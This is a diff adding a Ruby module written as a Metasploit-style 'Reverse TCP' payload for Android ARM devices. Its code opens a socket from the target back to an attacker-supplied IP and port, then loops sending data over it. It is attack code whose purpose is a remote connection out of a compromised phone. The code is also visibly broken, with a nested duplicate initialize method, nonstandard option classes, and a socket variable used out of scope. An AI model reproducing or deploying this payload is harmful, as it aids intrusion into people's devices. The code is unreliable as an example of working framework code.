@@ -1,0 +1,78 @@
+require 'msf/core'
+
+
+
+class Payload < Msf::Payload
+
+def initialize(info = {})
+
+super(update_info(info,
+
+'Name' => 'Reverse TCP',
+
+'Description' => %q{
+
+A reverse TCP payload that establishes a connection back to the attacker machine.
+
+},
+
+'Author' => ['eli'],
+
+'License' => MSF_LICENSE,
+
+'Platform' => [OS::Android],
+
+'Arch' => ARCH_ARMLE,
+
+))
+
+
+
+register_options(
+
+[
+
+Opt::String.new('ATTACKER_IP', [true, "Attacker's IP address"]),
+
+Opt::Int.new('ATTACKER_PORT', [true, "Attacker's port number"]),
+
+]
+)
+
+
+
+def initialize
+
+super
+
+
+
+@attacker_ip = datastore['ATTACKER_IP']
+
+@attacker_port = datastore['ATTACKER_PORT']
+
+
+
+# Establish reverse TCP connection
+
+sock = Rex::Socket.create_tcp_client(@attacker_ip, @attacker_port)
+
+print_status("Connected to attacker machine!")
+
+end
+
+
+
+def run
+
+while true do
+
+# Send data over the socket...
+
+send_data(sock.recv(1024))
+
+sleep 1
+
+end
+
+end
